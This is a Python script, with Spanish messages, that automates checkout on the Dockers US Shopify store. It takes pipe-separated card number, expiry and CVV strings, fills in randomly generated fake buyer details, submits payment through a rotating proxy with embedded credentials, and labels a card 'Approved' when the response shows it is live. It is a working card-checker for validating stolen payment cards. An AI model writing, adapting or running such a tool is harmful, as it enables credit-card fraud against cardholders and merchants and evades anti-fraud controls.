
import base64
from bs4 import BeautifulSoup
import random
import urllib.parse
import aiohttp
import asyncio
import json
import names
import platform
import AdyenEncrypt
import html
import ssl
import certifi
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}@gmail.com"

async def CMDsbCHK(cc, proxyrand):
    timeout=20
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3]

        max_retries = 3
        retry_delay = 1
        for retry in range(max_retries):
            try:
                #---------------------------------REQUEST NUMERO 1------------------------------#
                #---------------------------------REQUEST NUMERO 1------------------------------#        
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'es-ES,es;q=0.8,en-gb;q=0.5,en;q=0.3',
                    'Referer': 'https://us.dockers.com/collections/sale-clothing/products/v-neck-tee-shirt-slim-fit-a17590004?objectId=41433636110497&activeIndex=shopify_products_price_asc&queryId=cb341f8f73871762a8f166c6b7931652',
                    'Origin': 'https://us.dockers.com',
                    'Alt-gbed': 'us.dockers.com',
                    'Connection': 'keep-alive',
                    # 'Cookie': 'AKA_A2=A; WCXSID=3045454278153918967279757603; TLTSID=00003045454278153918967279757603; ajs_anonymous_id=%22b077bbcf-7f51-4a94-8c2d-52a4629a8f5d%22; AMCV_B7FF1CFE5330995F0A490D45%40AdobeOrg=1585540135%7CMCIDTS%7C19408%7CMCMID%7C61365190381223431572855965869978278853%7CMCAAMLH-1677452526%7C4%7CMCAAMB-1677452526%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1676854927s%7CNONE%7CMCAID%7CNONE%7CMCSYNCSOP%7C411-19415%7CvVersion%7C4.4.0; RT="z=1&dm=dockers.com&si=1aac40a9-df76-4ArKvohoDv1EnBbQtxfDP32BzpTyM2QTm1y9rjNs3Rysgu4Ku5rK2nKbP1GVGo5kxZFZ7x7iaHzLwGijEg9QXyXJUWZA31S=110tfi7t&cl=9f7&ul=9fm&hd=af1"; AMCVS_B7FF1CFE5330995F0A490D45%40AdobeOrg=1; _gcl_au=1.1.1867624994.1676847727; s_cc=true; s_sq=leviseulevi-gb-prod%252Clevilsalse-prod%3D%2526c.%2526a.%2526activitymap.%2526page%253DGlobal%252520Country%252520Picker%2526link%253DUnited%252520States%2526region%253Ddata-drilldown-5%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c; keep_alive=dfeb2922-c784-4ArKvohoDv1EnBbQtxfDP32BzpTyM2QTm1y9rjNs3Rysgu4Ku5rK2nKbP1GVGo5kxZFZ7x7iaHzLwGijEg9QXyXJUWZA31S.dockers.com%2F; _landing_page=%2F; _y=9b34099d-5e17-4bca-ba29-a128225417f6; _s=b71be3ae-887a-418f-a1de-61b888db4b44; _shopify_y=9b34099d-5e17-4bca-ba29-a128225417f6; _shopify_s=b71be3ae-887a-45PrWcWBvSAXGj8bD2EAcwLJEf6Bkfw9Y1EknVsZCggqiNixWMwTX9HNJQ24FVfuLa4t8eXt1HPA1iUitADJLCoS5ua3WQR498Z; _shopify_sa_p=; amp_f24a38=o0vWrK_7zbauH3Y3mFodcf...1gplujph4.1gplumci6.0.0.0; _ga_RZYPECQ40Y=GS1.1.1676847736.1.1.1676847822.0.0.0; _ga=GA1.2.96749726.1676847737; redirect_geolocation={%22continentCode%22:%22NA%22%2C%22continentName%22:%22North%20America%22%2C%22countryCode%22:%22US%22%2C%22countryName%22:%22United%20States%22}; BVBRANDID=15bd0a17-77ce-4c9b-b07c-f2d175ada1e1; BVBRANDSID=29726ba3-d01f-4153-9f50-25569b46b0de; _ALGOLIA=anonymous-811be9d7-8fee-45PrWcWBvSAXGj8bD2EAcwLJEf6Bkfw9Y1EknVsZCggqiNixWMwTX9HNJQ24FVfuLa4t8eXt1HPA1iUitADJLCoS5ua3WQRdWlkPU5tVXlaakZtWldNdE9ESXdZeTAwTURObExUaGlNV1V0TVdFM09EWTJZemN4WldObA; cart=2cb5837248fd0b27345a6108ceba72a5; cart_ts=1676847830; cart_sig=57b69311d05031f88d453a304ba6b0da; cart_ver=gcp-gb-central1%3A9; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Feb+19+2023+18%3A03%3A52+GMT-0500+(hora+est%C3%A1ndar+de+Per%C3%BA)&version=202211.1.0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0004%3A1%2CC0002%3A1%2CC0003%3A1%2CC0001%3A1&AwaitingReconsent=false; _sctr=1|1676782800000; _gid=GA1.2.446374268.1676847741; user_id=anonymous-811be9d7-8fee-472f-ae8e-3762086a0f27; crl8.fpcuid=35955e4e-6cae-405c-8d89-5fad57d30de2; _fbp=fb.1.1676847747806.389613000; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2NzY4NDc3NTAsInZhbHVlIjoiaHR0cHM6Ly91cy5kb2NrZXJzLmNvbS8iLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly91cy5kb2NrZXJzLmNvbS9jb2xsZWN0aW9ucy9tZW5zLWJpZy10YWxsLWNsb3RoaW5nIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjc2ODQ3ODMwLCJ2YWx1ZSI6Imh0dHBzOi8vdXMuZG9ja2Vycy5jb20vIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vdXMuZG9ja2Vycy5jb20vY29sbGVjdGlvbnMvbWVucy1iaWctdGFsbC1jbG90aGluZyJ9fQ==; IR_gbd=dockers.com; IR_5411=1676847829974%7C0%7C1676847829974%7C%7C; IR_PI=80b6d27c-b0a9-11ed-9db3-3d4bd797de61%7C1676934155512; irclickid=~1X38541693812VY3238c5WXWYNQRWSKPLOECDsunkjia~71ZVRNE; _gat_gtag_UA_203062948_2=1; _uetsid=7590cbf0b0a911edbaef5d1a9cd647ac; _uetvid=7590abc0b0a911ed859ba70f62bcb39e; cart_currency=USD; OptanonAlertBoxClosed=2023-02-19T23:03:52.833Z',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                })
                try:
                    data = {
                        'Shirts & Outerwear': 'M',
                        'id': '41433636110497',
                        'properties[_max_inventory]': '22',
                        'properties[_pc9]': 'A17590004',
                    }
                    async with session.post('https://us.dockers.com/cart/add.js', data=data, timeout=18, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/")) as resp:
                        response = await resp.text()
                        if (int(response.find('Cart Error')) > 0):
                            data = {
                                'Shirts & Outerwear': 'XL',
                                'id': '41433636569249',
                                'properties[_max_inventory]': '23',
                                'properties[_pc9]': 'A17590004',
                            }
                            async with session.post('https://us.dockers.com/cart/add.js', data=data, timeout=18, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/")) as resp:
                                response = await resp.text()
                                if (int(response.find('Cart Error')) > 0):
                                    return "Stock Problem!"
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 2------------------------------#
                #---------------------------------REQUEST NUMERO 2------------------------------#
                try :
                    data = {
                        'quantity': '1',
                        'checkout': 'Go to Checkout',
                    }
                    async with session.post('https://us.dockers.com/cart', data=data,proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"), timeout=18) as resp:
                        response = await resp.text()
                        soup = BeautifulSoup(response , 'lxml')
                        resp_realurl = str(resp.real_url)
                        checkout_token = resp_realurl.split("/")[5]
                        authenticity_token1 = soup.find("input", {"name": "authenticity_token"})["value"]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except IndexError :
                    print(f"Error al conectarse {retry+1}/{max_retries}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 3------------------------------#
                #---------------------------------REQUEST NUMERO 3------------------------------#
                try :
                    data = [
                        ('_method', 'patch'),
                        ('authenticity_token', authenticity_token1),
                        ('previous_step', 'contact_information'),
                        ('step', 'shipping_method'),
                        ('checkout[email]', CorreoRand),
                        ('checkout[buyer_accepts_marketing]', '0'),
                        ('checkout[buyer_accepts_marketing]', '1'),
                        ('checkout[shipping_address][first_name]', ''),
                        ('checkout[shipping_address][last_name]', ''),
                        ('checkout[shipping_address][address1]', ''),
                        ('checkout[shipping_address][address2]', ''),
                        ('checkout[shipping_address][city]', ''),
                        ('checkout[shipping_address][country]', ''),
                        ('checkout[shipping_address][province]', ''),
                        ('checkout[shipping_address][zip]', ''),
                        ('checkout[shipping_address][phone]', ''),
                        ('checkout[shipping_address][country]', 'United States'),
                        ('checkout[shipping_address][first_name]', names.get_first_name()),
                        ('checkout[shipping_address][last_name]', names.get_last_name()),
                        ('checkout[shipping_address][address1]', f'{random.randint(1000,9999)} Street Road'),
                        ('checkout[shipping_address][address2]', ''),
                        ('checkout[shipping_address][city]', 'Feasterville-Trevose'),
                        ('checkout[shipping_address][province]', 'PA'),
                        ('checkout[shipping_address][zip]', '19053'),
                        ('checkout[shipping_address][phone]', f'(676) {random.randint(100,999)}-{random.randint(1000,9999)}'),
                        ('checkout[remember_me]', 'false'),
                        ('checkout[remember_me]', '0'),
                        ('checkout[buyer_accepts_sms]', '0'),
                        ('checkout[sms_marketing_phone]', ''),
                        ('checkout[client_details][browser_width]', '568'),
                        ('checkout[client_details][browser_height]', '927'),
                        ('checkout[client_details][javascript_enabled]', '1'),
                        ('checkout[client_details][color_depth]', '24'),
                        ('checkout[client_details][java_enabled]', 'false'),
                        ('checkout[client_details][browser_tz]', '300'),
                    ]
                    async with session.post(f'https://us.dockers.com/53227258017/checkouts/{checkout_token}', data=data, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"), timeout=18) as resp:         
                        soup_response = await resp.text()
                        soup = BeautifulSoup(soup_response , 'lxml')
                        authenticity_token2 = soup.find("input", {"name": "authenticity_token"})["value"]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️' 
                except TypeError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"

                #---------------------------------REQUEST NUMERO 4------------------------------#
                #---------------------------------REQUEST NUMERO 4------------------------------#
                try :  
                    data = {
                        '_method': 'patch',
                        'authenticity_token': authenticity_token2,
                        'previous_step': 'shipping_method',
                        'step': 'payment_method',
                        'checkout[shipping_rate][id]': 'shopify-Ground%20Delivery%20(5-7%20business%20days)-7.95',
                        'checkout[client_details][browser_width]': '697',
                        'checkout[client_details][browser_height]': '927',
                        'checkout[client_details][javascript_enabled]': '1',
                        'checkout[client_details][color_depth]': '24',
                        'checkout[client_details][java_enabled]': 'false',
                        'checkout[client_details][browser_tz]': '300',
                    }
                    async with session.post(f'https://us.dockers.com/53227258017/checkouts/{checkout_token}', data=data, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:        
                        soup_response = await resp.text()
                        soup = BeautifulSoup(soup_response , 'lxml')
                        authenticity_token3 = soup.find("input", {"name": "authenticity_token"})["value"]
                        prices = (soup_response.split('data-checkout-payment-due-target="')[1]).split('">')[0]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️' 
                except TypeError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 5------------------------------#
                #---------------------------------REQUEST NUMERO 5------------------------------#
                if mes[0:1] == '1': mesnew = mes
                else : mesnew = mes[1:2]

                headers = {
                    'Accept': 'application/json',
                    'Accept-Language': 'es-419,es;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive',
                    'Origin': 'https://checkout.shopifycs.com',
                    'Pragma': 'no-cache',
                    'Referer': 'https://checkout.shopifycs.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'Sec-GPC': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
                }
                json_data = {
                    'credit_card': {
                        'number': ccnum,
                        'name': 'juan izaza',
                        'month': mesnew,
                        'year': ano,
                        'verification_value': cvv,
                    },
                    'payment_session_scope': 'us.dockers.com',
                }
                try :
                    async with session.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data, timeout=timeout, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/")) as resp:              
                        jsonresponse = await resp.json()
                        token = jsonresponse["id"]
                except UnboundLocalError :
                    print(f"Error al conectarse {retry+1}/{max_retries}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"  
                except TypeError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3" 
                #---------------------------------REQUEST NUMERO 6------------------------------#
                #---------------------------------REQUEST NUMERO 6------------------------------#
                try:
                    data = {
                        '_method': 'patch',
                        'authenticity_token': authenticity_token3,
                        'previous_step': 'payment_method',
                        'step': '',
                        's': token,
                        'checkout[payment_gateway]': '64526352545',
                        'checkout[credit_card][vault]': 'false',
                        'checkout[different_billing_address]': 'false',
                        'checkout[total_price]': prices,
                        'complete': '1',
                        'checkout[client_details][browser_width]': '714',
                        'checkout[client_details][browser_height]': '927',
                        'checkout[client_details][javascript_enabled]': '1',
                        'checkout[client_details][color_depth]': '24',
                        'checkout[client_details][java_enabled]': 'false',
                        'checkout[client_details][browser_tz]': '300',
                    }
                    async with session.post(f'https://us.dockers.com/53227258017/checkouts/{checkout_token}', data=data, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:               
                        True
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"    
                #---------------------------------REQUEST NUMERO 7------------------------------#
                #---------------------------------REQUEST NUMERO 7------------------------------#
                try:
                    async with session.get(f'https://us.dockers.com/53227258017/checkouts/{checkout_token}/processing', proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:
                        True
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 8------------------------------#
                #---------------------------------REQUEST NUMERO 8------------------------------#
                try:
                    async with session.get(f'https://us.dockers.com/53227258017/checkouts/{checkout_token}/processing?from_processing_page=1', proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:
                        True
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 9------------------------------#
                #---------------------------------REQUEST NUMERO 9------------------------------#
                try:
                    async with session.get(f'https://us.dockers.com/53227258017/checkouts/{checkout_token}?from_processing_page=1&validate=true', proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:         
                        response = await resp.text()
                        soup = BeautifulSoup(response, "html.parser")
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #------------ ---------------------CHECCK REQUESTS------------------------------#
                if (int(response.find('Invalid card verification number')) > 0) or (int(response.find('Insufficient funds in the account')) > 0) or (int(response.find('The card has reached the credit limit')) > 0):
                    search = soup.find_all("p", class_="notice__text")
                    search = search[0]
                    search = str(search).replace('<p class="notice__text">',"").replace('</p>',"")
                    return "Approved", search
                elif int(response.find('"notice__text"')) > 0 :
                    search = soup.find_all("p", class_="notice__text")
                    search = search[0]
                    search = str(search).replace('<p class="notice__text">',"").replace('</p>',"")
                    return search
                elif int(response.find('Thank you for your purchase')) > 0 :
                    return "Approved", "Charged 15$"
                else :
                    return "3D Required. Please try again."
            except (aiohttp.client_exceptions.ServerDisconnectedError) as e:
                print(f"Error: {e}")
                return "An unexpected error occurred. ServerDisconnectedError. ♻️"
            except (asyncio.exceptions.TimeoutError) as e:
                return "An unexpected error occurred. Timeout Error. ♻️"
            except (aiohttp.client_exceptions.ClientConnectorError) as e:
                print(f"Error: {e}")
                return "An unexpected error occurred. ClientConnectorError. ♻️"
            finally:
                 await session.close()